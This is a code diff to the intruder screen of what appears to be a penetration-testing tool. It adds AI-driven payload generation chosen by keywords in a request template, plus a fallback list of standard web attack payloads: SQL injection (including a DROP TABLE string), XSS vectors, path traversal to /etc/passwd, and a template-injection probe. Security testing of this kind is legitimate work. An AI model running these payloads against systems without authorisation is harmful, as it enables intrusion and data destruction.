@@ -166,13 +166,71 @@ class IntruderScreen(Widget):
     @work(exclusive=True)
     async def generate_ai_payloads(self) -> None:
         url = self.query_one("#intruder-url", Input).value
-        self.notify("Generating AI payloads...", severity="information")
+        template = self.query_one("#request-template", TextArea).text
+
+        self.notify("Generating context-aware AI payloads...", severity="information")
         try:
             from vexor.ai.client import AIClient
             client = AIClient()
-            payloads = await client.generate_payloads(target=url, payload_type="general")
+
+            # Build context-aware prompt
+            context = f"URL: {url}\nRequest template: {template[:200]}"
+
+            # Detect what type of payloads are needed from template
+            payload_type = "general"
+            template_lower = template.lower()
+            if "username" in template_lower or "password" in template_lower or "login" in template_lower:
+                payload_type = "auth_bypass"
+            elif "search" in template_lower or "q=" in template_lower:
+                payload_type = "xss"
+            elif "id=" in template_lower or "user_id" in template_lower:
+                payload_type = "sqli"
+
+            payloads = await client.generate_payloads(
+                target=context,
+                payload_type=payload_type,
+                count=25
+            )
+
             if payloads:
-                self.query_one("#payload-list", TextArea).load_text('\n'.join(payloads))
-                self.notify(f"Generated {len(payloads)} payloads!", severity="information")
+                # Deduplicate
+                unique_payloads = list(dict.fromkeys(payloads))
+                self.query_one("#payload-list", TextArea).load_text('\n'.join(unique_payloads))
+                self.notify(f"Generated {len(unique_payloads)} unique payloads!", severity="information")
+            else:
+                # Fallback to built-in payloads
+                self._load_builtin_payloads(payload_type)
         except Exception as e:
-            self.notify(f"AI error: {str(e)}", severity="error")
+            self.notify(f"AI error: {str(e)[:50]}", severity="error")
+            self._load_builtin_payloads("general")
+
+    def _load_builtin_payloads(self, payload_type: str) -> None:
+        """Load built-in payloads as fallback"""
+        builtin = {
+            "auth_bypass": [
+                "admin", "administrator", "root", "test", "guest",
+                "' OR '1'='1", "' OR 1=1--", "admin'--",
+                "admin' #", "' OR 'x'='x", "1' OR '1'='1",
+            ],
+            "sqli": [
+                "'", "''", "' OR 1=1--", "' OR '1'='1",
+                "1 UNION SELECT NULL--", "' AND SLEEP(3)--",
+                "1; DROP TABLE users--", "' OR 1=1#",
+            ],
+            "xss": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "javascript:alert(1)",
+                "'><script>alert(1)</script>",
+            ],
+            "general": [
+                "' OR 1=1--", "<script>alert(1)</script>",
+                "../../../etc/passwd", "{{7*7}}",
+                "admin", "password", "test123",
+                "' AND SLEEP(3)--", "<img src=x onerror=alert(1)>",
+            ],
+        }
+        payloads = builtin.get(payload_type, builtin["general"])
+        self.query_one("#payload-list", TextArea).load_text('\n'.join(payloads))
+        self.notify(f"Loaded {len(payloads)} built-in payloads", severity="information")
